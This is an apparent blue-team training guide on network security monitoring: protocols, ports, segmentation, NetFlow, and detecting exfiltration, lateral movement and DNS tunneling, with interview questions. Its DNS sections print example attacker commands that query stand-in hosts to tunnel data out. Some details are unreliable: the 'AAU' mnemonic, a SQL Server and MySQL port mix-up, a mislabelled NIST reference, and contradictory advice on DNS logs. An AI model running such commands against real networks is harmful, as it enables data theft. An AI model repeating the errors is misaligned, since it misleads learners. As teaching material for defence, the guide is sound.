# 🔐 NETWORKING - BLUE TEAM STUDENT GUIDE

## 📖 What Is This?

**Networking in Cybersecurity** is the discipline of understanding how assets, devices, and servers are interconnected, how they communicate through specific protocols, and how to **detect, prevent, and respond to anomalous behavior** in network infrastructure.

In **30 seconds:** The network is the heart of any infrastructure. A blue teamer must understand how it normally works to detect when something is wrong.

---

## 🎯 Why Does A SOC/Blue Team Professional Need This?

### **Real Work Scenarios:**

1. **Intrusion Detection**
   - "Why is this user accessing from Japan at 3am when they normally connect from Mexico?"
   - → You need to understand **geolocation and access logs**

2. **Incident Investigation**
   - "What data was exfiltrated? To where?"
   - → You need to read **NetFlow, DNS logs, firewall logs**

3. **Attack Prevention**
   - "How do I stop someone from downloading the entire database?"
   - → You need **segmentation, firewall rules, anomalous traffic detection**

4. **Incident Escalation**
   - "Is this a real threat or normal behavior?"
   - → You need **to establish baselines and understand protocols**

### **Interview Questions You'll Get:**

- "Walk me through how you'd investigate a data exfiltration case"
- "What's the difference between a Layer 3 vs Layer 4 DDoS attack?"
- "How would you detect DNS tunneling in your SIEM?"
- "Explain network segmentation and why it matters"
- "A user tries to access admin resources from their normal account. What do you do?"

---

## 🔍 The Concept Broken Down

### **Part 1: Foundations - The Infrastructure**

#### **What Makes a Network Exist?**

A network requires:

| Component | Function | Relevance in SOC |
|-----------|----------|-----------------|
| **Devices** | Laptops, servers, switches, routers | Each generates logs |
| **Connection** | Cables, Wi-Fi, internet | Attack points |
| **Protocols** | Communication rules (TCP/IP) | Attack patterns |
| **Access** | Who connects | Control + Detection |

#### **The Infrastructure Reality:**

All these assets must:
- ✅ **Be connected** → Availability
- ✅ **Communicate securely** → Integrity
- ✅ **Be monitored** → Security
- ✅ **Coexist without conflicts** → Multiple users

---

### **Part 2: Protocols - The Language of Networks**

#### **What are Protocols?**

Rules that define HOW devices communicate. They're like "languages" of the network.

#### **Key Protocols for Blue Team:**

**LAYER 3 - NETWORK (IP):**
- **IP (IPv4/IPv6)** → Device address (192.168.1.10)
- **ICMP** → Ping, traceroute (can be DDoS)

**LAYER 4 - TRANSPORT:**
- **TCP** → Reliable connection (web, email, SSH)
- **UDP** → Fast connection no guarantee (DNS, streaming)

**LAYER 7 - APPLICATION:**
- **DNS** → Resolve names (google.com → 142.250.185.46)
- **HTTP/HTTPS** → Web traffic
- **SSH** → Secure server connection
- **SMB** → Windows file sharing
- **LDAP** → User directory (Active Directory)
- **RDP** → Remote desktop

#### **Why Does It Matter?**

Each protocol has:
- **Specific vulnerabilities** → Know how it's attacked
- **Unique logs** → Know where to find evidence
- **Normal behavior** → Know when something's wrong

**Example:**
```
Port 22 (SSH) on web server = ANOMALOUS
Port 443 (HTTPS) on web server = NORMAL

Why?
- SSH is for administration, not users
- If you see it, someone might be administering the server maliciously
```

---

### **Part 3: OSI Model - The 7 Layers of Network**

**Why is it important?** Because EACH LAYER has different attacks and defenses.

#### **Mnemonic to Remember:**

🇺🇸 **"Please Do Not Throw Sausage Pizza Away"**

| # | Layer | Mnemonic | Function | Common Attacks | Logs/Detection |
|---|-------|----------|----------|-----------------|-----------------|
| **7** | Application | **A**way | HTTP, DNS, SSH, FTP | SQL injection, Phishing, Buffer overflow | WAF logs, App logs |
| **6** | Presentation | **P**izza | Encryption, compression | SSL stripping, Decryption bypass | SSL/TLS handshake logs |
| **5** | Session | **S**ausage | Session management | Session hijacking, Token theft | Session logs, Cookie manipulation |
| **4** | Transport | **T**hrow | TCP, UDP, ports | SYN flood, Port scanning, UDP flood | Netstat, failed connections |
| **3** | Network | **N**ot | IP, routers | DDoS, IP spoofing, ICMP flood | NetFlow, IDS alerts, suspicious IPs |
| **2** | Data Link | **D**o | Switches, MAC, ARP | ARP spoofing, MAC flooding | DHCP logs, ARP tables |
| **1** | Physical | **P**lease | Cables, connectors | Cut cables, jamming | Port down alerts |

#### **Real Example - Multi-Layer Attack:**

```
User receives phishing email (Layer 7 - Application)
  ↓
Clicks link, downloads malware
  ↓
Malware connects to C2 server in Russia (Layer 4 - Transport, TCP port 443)
  ↓
Performs ARP spoofing to intercept traffic (Layer 2 - Data Link)
  ↓
Exfiltrates database data (Layer 3 - Network, using spoofed IPs)

Where do we detect it?
- Layer 7: WAF detects phishing
- Layer 4: Firewall sees connection to Russian IP
- Layer 2: ARP monitor sees anomalous changes
- Layer 3: NetFlow sees unusual outbound traffic
```

---

### **Part 4: Anomalous Behavior - What to Look For**

#### **What is Anomalous Behavior?**

Anything that deviates from "normal" and could indicate:
- 🚨 Account compromise
- 🚨 Malware executing
- 🚨 Data exfiltration
- 🚨 Internal attack

#### **Real Examples You Should Detect:**

**1. Impossible Geolocation**
```
User logged in from Mexico at 9:00 AM
5 minutes later logged in from Japan

→ IMPOSSIBLE to travel in 5 minutes
→ Account compromised or suspicious VPN
→ ALERT: Investigate login
```

**2. Command Execution Out of Hours**
```
PowerShell executing commands at 3:00 AM
User normally works 9-17:00

→ Who's using their account?
→ What commands are being run?
→ ALERT: Review PowerShell logs (Event ID 4688)
```

**3. Anomalous Data Transfer**
```
User downloads 50GB at 1:00 AM
Normally downloads 100MB daily

→ What data is being taken?
→ Where is it going?
→ Who authorized this?
→ ALERT: Block if possible, investigate
```

**4. Unauthorized Resource Access**
```
Marketing user tries accessing Accounting VLAN
Firewall blocks it

→ Why are they trying?
→ Is it compromise or user error?
→ ALERT: Contact user, review recent activity
```

**5. Activity on Unusual Ports**
```
Web server communicates on port 3389 (RDP)
Should only communicate on 80 and 443

→ Possible lateral movement by attacker
→ ALERT: Isolate server, investigate connections
```

---

## ⚙️ What You MUST Memorize

### **Common Ports and What Seeing Them Means:**

| Port | Protocol | Normal On | Anomalous On | Action |
|------|----------|-----------|--------------|--------|
| **22** | SSH | Linux servers | User laptop | Investigate |
| **80** | HTTP | Web server | Internal server | Review |
| **443** | HTTPS | Any web server | Non-standard port | Check certs |
| **3306** | MySQL | Database | User laptop | CRITICAL - Isolate |
| **3389** | RDP | Admin, server | Normal user | CRITICAL - Isolate |
| **5432** | PostgreSQL | Database | Unauthorized access | CRITICAL - Isolate |
| **445** | SMB | File server, domain | Web server, internet | Investigate lateral movement |
| **53** | DNS | Name resolution | Non-standard port | Look for DNS tunneling |

### **The 3 Questions to Always Ask:**

1. **Is this traffic AUTHORIZED?**
   - Should the user have access?
   - Should the device be connected?

2. **Is this traffic EXPECTED?**
   - What time does this normally happen?
   - How much data is typical?
   - Where does it normally connect?

3. **Is this traffic URGENT?**
   - Are there compromise indicators?
   - Is data being exfiltrated?
   - Does it need immediate escalation?

### **Mnemonic to Answer:**

**"AAU"** = Authorized, Authorized, Urgent
- If any is NO → Escalate

---

## 📚 What You MUST Understand Deeply

### **1. The Difference Between These Three:**

#### **DNS (Not a Data Transport)**

**What it's NOT:**
- DNS does NOT transport user data
- DNS is only a **name translator**

**What it IS:**
- google.com (name) → 142.250.185.46 (IP address)
- Uses port 53 UDP/TCP
- Used by EVERYTHING on the network (browsers, apps, malware)

**Why it's critical in SOC:**

```
Case 1: DNS Tunneling (exfiltration)
Attacker: nslookup secret-data.attacker.com
DNS query containing encrypted data
→ Looks like normal DNS but carries data

Case 2: DNS Beaconing (malware communicating)
Malware: Every minute queries x9ak3.malware-c2.ru
→ It's the malware's heartbeat (how it communicates)

Case 3: DNS Hijacking (interception)
Attacker: Redirects google.com → fake-google.com
→ User thinks they're at Google but it's fake

DETECTION:
- Search for queries to known malicious domains (blacklist)
- Search for patterns: Same domain, every X seconds
- Search for unusually large DNS responses
```

#### **Segmentation (Not Just "Isolation")**

**What you said:** "Isolating servers"  
**What it really is:** Dividing network into **subnets with communication rules between them**

**Real Example:**

```
NETWORK WITHOUT SEGMENTATION:
┌──────────────────────────────────────┐
│  Everything in same network (172.16.0.0/16)
│  Users, web server, DB, admin all together
│  Attacker enters web server → access everything
└──────────────────────────────────────┘

NETWORK WITH SEGMENTATION:
┌─────────────────┐
│ DMZ (172.16.1.0)│ ← Web servers (internet access)
├─────────────────┤ FIREWALL: DMZ ↔ Users (only port 443)
│ Users           │
│ (172.16.2.0)    │ FIREWALL: Users ↔ Servers (specific ports only)
├─────────────────┤
│ Servers/DB      │
│ (172.16.3.0)    │ FIREWALL: Servers ↔ Admin (very restrictive)
├─────────────────┤
│ Admin/IT        │
│ (172.16.4.0)    │
└─────────────────┘

BENEFIT IN SOC:
- User tries port 22 to DB → BLOCKED + ALERT
- Attacker in DMZ can't reach DB → Contained
- Each movement lateral generates log → Clear investigation
```

#### **Operational Rules vs Detection Rules:**

| Type | Function | Owner | Where |
|------|----------|-------|-------|
| **Operational** | Define EXPECTED behavior | IT/Networks | Documentation, policies |
| **Security** | Implement TECHNICAL restrictions | Firewall, NAC, IAM | Devices |
| **Detection** | Alert on ANOMALOUS behavior | SOC, SIEM | Logs, sensors |

**Real Example:**

```
OPERATIONAL RULE:
"Users can browse internet during business hours"

SECURITY RULE:
"Firewall only allows HTTP/HTTPS on ports 80/443, blocks everything else"

DETECTION RULE:
"If user downloads >100MB between 22:00-06:00, escalate as P2"

Scenario:
User tries downloading 500MB at 3:00 AM
  → SECURITY RULE: Firewall sees it
  → DETECTION RULE: SIEM alerts it
  → YOU INVESTIGATE: What's downloading? Authorized? Malware?
```

### **2. The Concept of "Baseline"**

**What is it?** The NORMAL behavior of your network.

```
Without Baseline (first days):
Anything could be attack → Huge false positives

With Baseline Established:
User "X" normally downloads ~100MB daily during 9-17
Today downloaded 500MB at 3am
→ This IS anomalous → Investigate

Baseline should include:
- Who normally accesses what?
- How much data typically transfers?
- What times?
- Geographic locations?
```

### **3. Network Flow (NetFlow)**

**What is it?** The "leftovers" traffic leaves on the network.

```
When user downloads file:
- The file itself is NOT captured
- But this IS captured:
  - Source IP (192.168.1.10)
  - Destination IP (142.250.185.46)
  - Source port (52341)
  - Destination port (443)
  - Bytes sent: 0
  - Bytes received: 500,000,000
  - Duration: 5 minutes

With this the blue teamer knows:
"User downloaded 500MB from google.com in 5 minutes"
Without seeing the entire file.
```

---

## 🚨 Attacks and Specific Defenses

### **Attack 1: Data Exfiltration (Data Theft)**

#### **How it works:**

```
Attacker already has network access (insider, prior compromise)
  ↓
Finds valuable data (database, documents)
  ↓
Copies data to external drive or cloud
  ↓
Sends data outside the network
```

#### **Where you see it:**

| Log | What to Look For | Example |
|-----|-----------------|---------|
| NetFlow | Unusual outbound connection, high volume | Source: internal laptop → Destination: AWS (>10GB) |
| Firewall | Outbound connection attempt blocked/anomalous | User 192.168.1.50 tries to 45.33.32.1 port 443 |
| DNS | Queries to suspicious cloud domains | nslookup dropbox.com, mega.nz, pastebin.com |
| Proxy | Download to file-sharing sites | User "jsmith" downloaded 5GB to mega.nz |
| Endpoint | Access to sensitive files | "contract_2024.xlsx" accessed by "bperez" at 3am |

#### **How it's prevented:**

✅ **Segmentation:** DB in separate VLAN, users can't access directly  
✅ **Firewall:** Block unauthorized outbound ports  
✅ **DLP (Data Loss Prevention):** Tool detecting exfiltration patterns  
✅ **Endpoint Detection:** Monitor mass file copies  
✅ **Logging:** Audit access to sensitive files  

---

### **Attack 2: Lateral Movement**

#### **How it works:**

```
Attacker has access to normal user laptop
  ↓
Laptop has access to shared File Server
  ↓
Attacker uses cached credentials to jump to File Server
  ↓
From File Server can reach Database Server
  ↓
Finally accesses critical data
```

#### **Where you see it:**

| Log | Anomalous Signal |
|-----|------------------|
| **Firewall** | Laptop tries talking to port 445 (SMB) on DB |
| **Firewall** | User from laptop tries port 3306 (MySQL) |
| **Segmentation** | Violation: Users-VLAN ↔ Servers-VLAN |
| **Active Directory** | Multiple failed logins on service account |
| **Antivirus** | Hacking tools detected (mimikatz, psexec) |

#### **How it's prevented:**

✅ **Segmentation:** Users ↔ Servers blocked by firewall  
✅ **Endpoint Detection:** Detect hacking tools  
✅ **Credential Guard:** Don't cache high-level credentials  
✅ **MFA (Multi-Factor Auth):** Make credential theft harder  
✅ **Movement Monitoring:** Alert when account jumps between subnets  

---

### **Attack 3: DDoS (Denial of Service)**

#### **How it works:**

```
Attacker sends thousands of fake connections
  ↓
Legitimate server exhausted responding
  ↓
Real users can't connect
```

#### **Where you see it:**

| Layer | Log | Signal |
|-------|-----|--------|
| **Layer 3 (Network)** | NetFlow | 1,000 different IPs → your web server on port 80 |
| **Layer 4 (Transport)** | IDS/IPS | SYN flood, UDP flood |
| **Layer 7 (Application)** | WAF | Identical HTTP requests from multiple IPs |

#### **How it's prevented:**

✅ **Rate Limiting:** Max X connections per second  
✅ **Geo-blocking:** Block IPs from unexpected countries  
✅ **DDoS Mitigation:** Services like Cloudflare, Akamai  
✅ **IDS/IPS:** Detect and block DDoS patterns  

---

### **Attack 4: DNS Tunneling (Covert Communication)**

#### **How it works:**

```
Malware infects laptop
  ↓
Can't connect directly (firewall blocks)
  ↓
Uses DNS to "tunnel" data (encrypted in DNS queries)
  ↓
Communicates with C2 server every minute
```

#### **Where you see it:**

```
NORMAL:
nslookup google.com
→ 1 query, normal IP response

SUSPICIOUS (DNS Tunneling):
nslookup a9k3jfh2k1jh2k1jh21kj3h2kj1h2k1h2k1h.malware-c2.ru
→ Very long query
→ Repeats every exact minute
→ Anomalous response or no response
```

#### **How it's prevented:**

✅ **DNS Filtering:** Block known malicious domains  
✅ **DNS Monitoring:** Detect patterns (beaconing every X seconds)  
✅ **Response Validation:** Response doesn't match query  
✅ **Query Limiting:** Max X queries per minute per client  

---

## ❌ Common Mistakes Students Make

### **Mistake 1: "DNS Transports Data"**

❌ **Incorrect:** "DNS moves data from one place to another"

✅ **Correct:** "DNS resolves names to IP addresses. TCP/UDP does the transport"

**Why it matters:**
- Interview: You get corrected immediately
- In SOC: If you don't understand DNS, you can't detect DNS tunneling
- It's like confusing the phone directory (DNS) with the phone company (TCP)

---

### **Mistake 2: "Segmentation is just isolating servers"**

❌ **Incorrect:** "We separated the DB server, it's segmented"

✅ **Correct:** "Segmentation creates VLANs with firewall rules between them saying WHAT can talk to WHAT"

**Consequence of mistake:**
- You put DB in separate VLAN
- But firewall allows EVERYTHING → Malware still moves laterally
- You think you're secure but you're not

---

### **Mistake 3: "If firewall blocked it, it was an attack"**

❌ **Incorrect:** "Firewall blocked connection attempt, it was an attack"

✅ **Correct:** "Firewall blocked something, could be:
- User trying unauthorized access (normal)
- Attack (needs investigation)
- Malware (needs escalation)"

**Consequence:**
- Escalate EVERYTHING as critical → False positives everywhere
- SOC gets saturated → You lose credibility

---

### **Mistake 4: Confused Logs**

❌ **Incorrect:** "I'll check DNS logs for data exfiltration"

✅ **Correct:** "Exfiltration I see in:
1. NetFlow (anomalous volume)
2. Firewall (outbound connection)
3. Proxy (cloud download)
4. Endpoint (file access)"

**Consequence:**
- Waste time on wrong logs
- Interview: Serious technical mistake

---

### **Mistake 5: Not Understanding Baselines**

❌ **Incorrect:** "User downloaded 100MB, that's anomalous"

✅ **Correct:** "Need to know:
- How much do they normally download?
- At what time?
- From where?
- To where?
- Is it their job to download data?"

**Consequence:**
- False positives constantly
- Bad reputation in SOC

---

## 🧪 Practical Scenarios to Analyze

### **Scenario 1: The Impossible Access**

```
Event:
- 9:00 AM: User "jgarcia" logs in from Mexico (192.168.1.50)
- 9:05 AM: User "jgarcia" logs in from Japan (202.214.X.X)

Analysis:
1. What logs do I check?
   - Login events (Event ID 4624 on Windows)
   - IP geolocation
   - VPN logs (Did they use VPN?)

2. What questions do I ask?
   - Did jgarcia travel to Japan?
   - Is VPN connected?
   - Do they share passwords?

3. What action do I take?
   - Low: Contact user, verify
   - Medium: Reset password, review recent activity
   - High: If more changes, isolate account

CONCLUSION: Likely compromise. Requires investigation.
```

### **Scenario 2: The 3am Download**

```
Event:
NetFlow shows:
- Source IP: 192.168.1.75 (employee laptop)
- Destination IP: 54.239.28.30 (AWS)
- Bytes sent: 100MB
- Bytes received: 0
- Time: 03:15 AM

Analysis:
1. What does this mean?
   - Laptop UPLOADED 100MB to AWS
   - Not a download, an UPLOAD
   - Outside working hours

2. What supplementary logs do I check?
   - Firewall: Was connection allowed?
   - DNS: What domain in AWS was resolved?
   - Endpoint: What file was copied?
   - Proxy: Any upload record?

3. What action?
   - CRITICAL: Possible data exfiltration
   - Isolate laptop, freeze account
   - Review files accessed in last 24h

CONCLUSION: High probability of compromise. Immediate escalation needed.
```

### **Scenario 3: The Lateral Movement**

```
Event:
Firewall log:
- Source: 192.168.2.105 (user laptop)
- Destination: 192.168.3.50 (SQL Server)
- Port: 3306 (MySQL)
- Status: BLOCKED

Analysis:
1. What happened?
   - Laptop tried connecting to DB
   - Firewall blocked it (good segmentation)
   - But someone tried

2. Who is 192.168.2.105?
   - Which laptop?
   - Who uses it?
   - Does it have malware?

3. Action?
   - Medium: Contact user "Did you try connecting to DB?"
   - If NO: Malware confirmed
   - Isolate laptop, antivirus scan, investigate compromise

CONCLUSION: Possible blocked lateral movement. Requires investigation.
```

### **Questions to Answer (You answer):**

**Scenario 1:** What if user confirms they traveled to Japan?

**Scenario 2:** How would you know what file was uploaded if you only see NetFlow?

**Scenario 3:** Why is it important that the firewall BLOCKED the attempt?

---

## ❓ Interview Questions You Might Get

### **Level 1 (Junior/Entry):**

1. "Describe the 7 layers of the OSI model and give an attack example for each"
   
2. "What's the difference between TCP and UDP? When would you use each?"

3. "What is network segmentation and why is it important?"

4. "How would you investigate a case where a user downloads 50GB at 3am?"

5. "What is DNS and how would you detect DNS tunneling?"

**Expected Answers:**

1. (Use mnemonic "Please Do Not Throw Sausage Pizza Away" + 1 attack per layer)
2. TCP=reliable, UDP=fast. TCP for critical data, UDP for streaming
3. Dividing network into subnets with firewall rules between them
4. (Review NetFlow, Firewall, Proxy, Endpoint logs. Validate with user)
5. (DNS resolves names. Tunneling = encrypted data in DNS queries)

---

### **Level 2 (Intermediate/Mid-Level):**

1. "Walk me through investigating a data exfiltration case end-to-end"

2. "How would you detect lateral movement in your network?"

3. "Explain NetFlow and how you'd use it in an investigation"

4. "What's the difference between an operational firewall rule vs a detection rule?"

5. "User normally downloads 100MB daily. Today 500MB. Do you investigate? Why?"

**Expected Answers:**

1. (NetFlow → Firewall → Proxy → Endpoint → Active Directory for context)
2. (Monitor high port attempts, firewall violations between VLANs, suspicious tools)
3. (Connection metadata: source/dest IPs, ports, volume. Useful for pattern detection)
4. (Operational = what's allowed. Detection = what to alert on when it happens)
5. (Depends on baseline. But yes, because it deviates from normal)

---

### **Level 3 (Senior/Expert):**

1. "Design a segmented network architecture for a 500-person company. Justify each segment."

2. "An attacker compromises a laptop. How would they move laterally? How do you stop them?"

3. "How would you differentiate between legitimate remote worker and attacker using stolen credentials?"

4. "Propose a data exfiltration detection strategy using only firewall and NetFlow logs"

5. "How would you establish network traffic baseline without generating false positives?"

**Expected Answers:**

1. (DMZ, Users, Servers, Admin. With granular firewall between each. Explain reasoning)
2. (Lateral movement: SMB, RDP, LDAP. Defense: Segmentation, MFA, EDR, NetFlow monitoring)
3. (Geolocation, times, volume, protocols. Baseline + anomalies = risk score)
4. (Anomalous outbound volume + connections to never-seen IPs + long duration + high ports)
5. (Collect normal data 1-2 months, use ML, adjust thresholds, validate)

---

## 🔗 How This Connects To Everything Else

### **Connections in Your Blue Team Roadmap:**

| Topic | Connection to Networking |
|-------|-------------------------|
| **Active Directory (AD)** | The "heart" of authentication. AD logs show WHO logged in and FROM WHERE |
| **SIEM (Splunk, ELK)** | Collects ALL network logs (firewall, DNS, NetFlow). No SIEM = no pattern detection |
| **Endpoint Detection (EDR)** | Sees what happens IN the machine. Networking sees what happens BETWEEN machines |
| **Windows Event Logs** | Event ID 4688 = command executed. 4624 = login. Combine with firewall logs |
| **Incident Response** | Investigating incidents = tracing attacker path through logs. Networking is foundational |
| **Threat Hunting** | Search for patterns in NetFlow, DNS, firewall. Networking is the basis |
| **Cloud Security** | AWS/Azure have network logging same as on-prem. Same concept |
| **Firewalls (PAN-OS, Cisco)** | The "gates" of your network. Need to understand rules and logs |

**Real Incident Connection:**

```
Incident: Possible ransomware
  ↓
EDR detects: Suspicious process on laptop
  ↓
Active Directory: User "jsmith" login confirmed
  ↓
Firewall: Laptop tries connecting to 45.33.32.1 port 443
  ↓
NetFlow: 500MB to that IP in 5 minutes
  ↓
DNS: Prior query to malware-c2.ru
  ↓
Conclusion: Ransomware communicating with C2, exfiltrating data
  ↓
Action: Isolate laptop, block IP in firewall, reset credentials
```

Without Networking, you can't see this complete picture.

---

## 💾 TL;DR for Busy People

### **Quick Reference Table:**

| I Need To... | I Look For... | Log | Meaning |
|-------------|---------------|-----|---------|
| **Detect exfiltration** | High outbound volume | NetFlow | Someone taking data out |
| **Detect lateral movement** | Connection to SMB port (445) | Firewall | Attempt to access share |
| **Detect malware communicating** | Frequent DNS queries | DNS log | Malware "phoning" C2 |
| **Detect unauthorized access** | Login from new IP | AD login | Possible account compromise |
| **Detect DDoS** | Many connections from different IPs | IDS/IPS | Volume attack |
| **Detect blocked lateral movement** | Firewall DENY on high port | Firewall | Good segmentation, investigate attempt |

### **The 3 Main Network Logs:**

1. **Firewall Logs** → What connections are allowed/blocked
2. **NetFlow** → Traffic volume and direction
3. **DNS Logs** → What domains are resolved

If you understand these 3, you understand 80% of network security.

### **The 3 Golden Rules:**

✅ **Don't trust what you don't understand**  
✅ **Always validate with the user**  
✅ **If unsure, ESCALATE**

---

## 📌 Production Reality

### **What Actually Happens in a SOC:**

**Day 1:**
```
SIEM alerts: "User jgarcia login from Japan"
You: "What do I do?"
Answer: Check firewall, DNS, AD logs. Get context.
```

**Day 2:**
```
Ticket: "Network unusually slow"
You: Check NetFlow → find DDoS
Action: Escalate to network team, activate mitigation
```

**Day 3:**
```
EDR alert: "Suspicious process"
You: Check that machine's firewall logs
Question: Where was it connecting?
```

**The Reality:**
- 80% of alerts are false positives
- 15% are odd but legitimate
- 5% are real compromises
- Your job is finding that 5%

**Tools You'll ACTUALLY Use:**

✅ Splunk (SIEM) - Log searching  
✅ ELK Stack (Elasticsearch) - Data analysis  
✅ Wireshark - Traffic analysis (deep investigations)  
✅ Zeek (formerly Bro) - Network monitoring  
✅ Suricata/Snort - IDS/IPS  
✅ Firewall CLI - Direct log access  
✅ NetFlow Analyzer - Traffic visualization  

---

## 📚 Further Reading

### **Official Documents:**

- NIST SP 800-153: Guidelines on Network Security Testing
- OWASP Top 10: Web Security
- CIS Controls: Basic/Foundational Network Segmentation

### **Recommended Books:**

- "The Cyber Threat Playbook" - Michael Roytman
- "Network Security Through Data Analysis" - Applegate
- "Practical Packet Analysis" - Chris Sanders

### **Courses:**

- TryHackMe: Network Fundamentals
- HackTheBox: Network Labs
- Coursera: Network Security Basics

### **Related Certifications:**

- CompTIA Network+
- CompTIA Security+
- GCIA (GIAC Certified Intrusion Analyst)
- CEH (Certified Ethical Hacker)

---

## 🎯 Next Steps

### **To Solidify Your Knowledge:**

1. **Install Wireshark** on your lab
2. **Capture traffic** from normal actions (login, download, etc)
3. **Analyze patterns** (what protocols you see, what ports used)
4. **Break traffic** (try different attacks in lab, see how it looks in logs)
5. **Practice on TryHackMe** Network Fundamentals
6. **Run SOC scenarios** with real data (if you have access)

### **Self-Assessment Questions:**

- [ ] I understand what DNS is and how it differs from TCP/UDP
- [ ] I can explain the 7 OSI layers without notes
- [ ] I know what logs to check for each attack type
- [ ] I can design a simple segmented network
- [ ] I understand NetFlow and what high outbound volume means
- [ ] I know 5 common ports and what seeing them in odd places means

If you answered YES to all → Ready for basic interview level.

---

**Document Generated:** 07/25/2026  
**Level:** Junior to Intermediate Blue Teamer  
**Next Topics:** Active Directory Security | Incident Response Fundamentals | SIEM Basics

---

*Questions about this document? Create an issue in your repository or contact your instructor.*
